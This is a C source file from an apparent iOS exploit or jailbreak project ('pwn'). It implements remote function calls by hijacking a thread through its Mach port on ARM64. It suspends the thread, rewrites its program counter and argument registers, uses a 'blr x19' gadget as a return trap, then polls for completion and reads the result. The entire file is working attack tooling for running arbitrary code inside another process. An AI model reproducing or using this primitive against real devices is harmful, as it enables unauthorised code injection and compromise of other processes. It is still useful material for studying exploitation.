//
//  dxnu_rcall.c
//  pwn
//
//  Created by Sem Voigtländer on 1/8/19.
//  Copyright © 2019 Sem Voigtländer. All rights reserved.
//

#include "remotecall.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdarg.h>
#include <pthread.h>

#include <mach/mach.h>
#include <mach/task.h>
#include <mach/mach_error.h>
#include <mach/mach_traps.h>

#include "userlandgadgets.h"

#include "remotecall.h"
#include "remotemem.h"


void test_thread_control(mach_port_t thread_port) {
    _STRUCT_ARM_THREAD_STATE64 thread_state = {0};
    mach_msg_type_number_t thread_stateCnt = sizeof(thread_state)/4;
    kern_return_t err;
    err = thread_suspend(thread_port);
    if (err != KERN_SUCCESS) {
        printf("thread_suspend failed: %x (%s)\n", err, mach_error_string(err));
    }
    
    err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&thread_state, &thread_stateCnt);
    if (err != KERN_SUCCESS) {
        printf("thread_get_state failed: %x (%s)\n", err, mach_error_string(err));
    }
    
    printf("thread pc: 0x%016llx\n", thread_state.__pc);
    
    thread_state.__pc = 0x4141414141414141;
    
    err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&thread_state, thread_stateCnt);
    if (err != KERN_SUCCESS) {
        printf("thread_set_state failed: %x (%s)\n", err, mach_error_string(err));
    }
    
    printf("set state\n");
    
    err = thread_resume(thread_port);
    if (err != KERN_SUCCESS) {
        printf("thread_resume failed: %x (%s)\n", err, mach_error_string(err));
    }
    
    
    printf("resumed\n");
    
    sleep(100);
}


uint64_t blr_x19_addr = 0;
uint64_t
find_blr_x19_gadget()
{
    if (blr_x19_addr != 0){
        return blr_x19_addr;
    }
    char* blr_x19 = "\x60\x02\x3f\xd6";
    char* candidates[] = {blr_x19, NULL};
    blr_x19_addr = find_userlandgadget_candidate(candidates, 4);
    return blr_x19_addr;
}




void end_thread(mach_port_t thread_port) {
    thread_call_remote(thread_port, (void*)0x123456789, 0);
}


// no support for non-register args
#define MAX_REMOTE_ARGS 8
// thread should be suspended already; will return suspended
uint64_t thread_call_remote(mach_port_t thread_port, void* fptr, int n_params, ...)
{
    if (n_params > MAX_REMOTE_ARGS || n_params < 0){
        printf("unsupported number of arguments to remote function (%d)\n", n_params);
        return 0;
    }
    
    kern_return_t err;
    //#if 0
    // suspend the target thread we'll hijack:
    err = thread_suspend(thread_port);
    if (err != KERN_SUCCESS) {
        printf("failed to suspend the thread we're trying to hijack: %s\n", mach_error_string(err));
        return 0;
    }
    //#endif
    
    // save its suspended state so we can restore it:
    _STRUCT_ARM_THREAD_STATE64 saved_thread_state = {0};
    mach_msg_type_number_t saved_thread_stateCnt = sizeof(saved_thread_state)/4;
    // printf("saved thread state count before: %d\n", saved_thread_stateCnt);
    err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&saved_thread_state, &saved_thread_stateCnt);
    if (err != KERN_SUCCESS){
        printf("error getting thread state to save: %s\n", mach_error_string(err));
        return 0;
    }
    
    // dump the state:
    printf("pc: 0x%016llx\n", saved_thread_state.__pc);
    printf("sp: 0x%016llx\n", saved_thread_state.__sp);
    for (int i = 0; i < 29; i++) {
        printf("x%d: 0x%016llx\n", i, saved_thread_state.__x[i]);
    }
    
    // build the state we need for the arbitrary call:
    _STRUCT_ARM_THREAD_STATE64 fcall_thread_state = {0};
    mach_msg_type_number_t fcall_thread_stateCnt = sizeof(fcall_thread_state)/4;
    memcpy(&fcall_thread_state, &saved_thread_state, sizeof(fcall_thread_state));
    
    
    // make sure we can determine when the function call is done
    fcall_thread_state.__x[19] = find_blr_x19_gadget();
    fcall_thread_state.__lr = find_blr_x19_gadget();
    
    // set the pc
    fcall_thread_state.__pc = (uint64_t)fptr;
    
    // load the arguments
    va_list ap;
    va_start(ap, n_params);
    
    arg_desc* args[MAX_REMOTE_ARGS] = {0};
    
    __attribute__((unused)) uint64_t remote_buffers[MAX_REMOTE_ARGS] = {0};
    
    for (int i = 0; i < n_params; i++){
        arg_desc* arg = va_arg(ap, arg_desc*);
        
        args[i] = arg;
        
        switch(arg->type){
            case ARG_LITERAL:
            {
                printf("setting arg %d to literal %llx\n", i, arg->value);
                fcall_thread_state.__x[i] = arg->value;
                break;
            }
#if 0
            case ARG_BUFFER:
            case ARG_BUFFER_PERSISTENT:
            {
                uint64_t remote_buffer = alloc_and_fill_remote_buffer(task_port, arg->value, arg->length);
                remote_buffers[i] = remote_buffer;
                thread_state.__x[i] = remote_buffer;
                break;
            }
                
            case ARG_OUT_BUFFER:
            {
                uint64_t remote_buffer = remote_alloc(task_port, arg->length);
                printf("allocated a remote out buffer: %llx\n", remote_buffer);
                remote_buffers[i] = remote_buffer;
                thread_state.__x[i] = remote_buffer;
                break;
            }
#endif
            default:
            {
                printf("invalid argument type!\n");
            }
        }
    }
    
    va_end(ap);
    printf("fcall thread state:\n");
    printf("pc: 0x%016llx\n", fcall_thread_state.__pc);
    printf("sp: 0x%016llx\n", fcall_thread_state.__sp);
    printf("fp: 0x%016llx\n", fcall_thread_state.__fp);
    printf("lr: 0x%016llx\n", fcall_thread_state.__lr);
    for (int i = 0; i < 29; i++) {
        printf("x%d: 0x%016llx\n", i, fcall_thread_state.__x[i]);
    }
    
    // set the thread state:
    err = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&fcall_thread_state, fcall_thread_stateCnt);
    if (err != KERN_SUCCESS){
        printf("error setting new thread state for hijacked thread: %s\n", mach_error_string(err));
        return 0;
    }
    
    // let the thread continue running with the new state:
    err = thread_resume(thread_port);
    if (err != KERN_SUCCESS) {
        printf("error resuming hijacked thread: %s\n", mach_error_string(err));
        return 0;
    }
    
    printf("resumed thread\n");
    
    // monitor for the function call ending and the thread hitting the infinite loop:
    // we're reusing fcall state so we can also get the return value via x0
    while(1){
        usleep(100*1000);
        thread_suspend(thread_port);
        err = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&fcall_thread_state, &fcall_thread_stateCnt);
        if (err != KERN_SUCCESS){
            printf("error getting thread state: %s\n", mach_error_string(err));
            return 0;
        }
        
        thread_resume(thread_port);
        
        if (fcall_thread_state.__pc == find_blr_x19_gadget()){
            // thread has returned from the target function
            printf("hit looper!\n");
            break;
        }
        printf("got bad pc: 0x%llx\n", fcall_thread_state.__pc);
    }
    
    uint64_t ret_val = fcall_thread_state.__x[0];
    
    return ret_val;
}

